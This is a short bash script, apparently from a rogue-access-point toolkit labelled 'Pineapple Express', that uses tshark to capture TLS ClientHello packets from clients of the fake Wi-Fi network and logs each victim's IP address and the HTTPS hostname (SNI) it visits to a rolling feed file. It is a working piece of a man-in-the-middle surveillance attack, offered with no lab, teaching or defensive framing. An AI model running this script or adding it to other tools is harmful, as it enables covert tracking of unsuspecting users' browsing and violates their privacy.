#!/bin/bash
DIR="${DIR:-$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)}"
[ -f "$DIR/.env" ] && . "$DIR/.env"
AP_IF="${AP_IF:-wlan0}"
MON_IF="${MON_IF:-wlan1}"
# Pineapple Express - MITM monitor: logs HTTPS destinations (TLS SNI) of clients on the rogue AP.
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FEED="$DIR/mitm-feed.log"
: > "$FEED"
tshark -i $AP_IF -l -Y "tls.handshake.type==1" -T fields -e ip.src -e tls.handshake.extensions_server_name 2>/dev/null | while read -r src sni; do
  [ -z "$sni" ] && continue
  echo "$(date +%H:%M:%S)  $src -> $sni" >> "$FEED"
  tail -n 200 "$FEED" > "$FEED.tmp" 2>/dev/null && mv "$FEED.tmp" "$FEED" 2>/dev/null
done
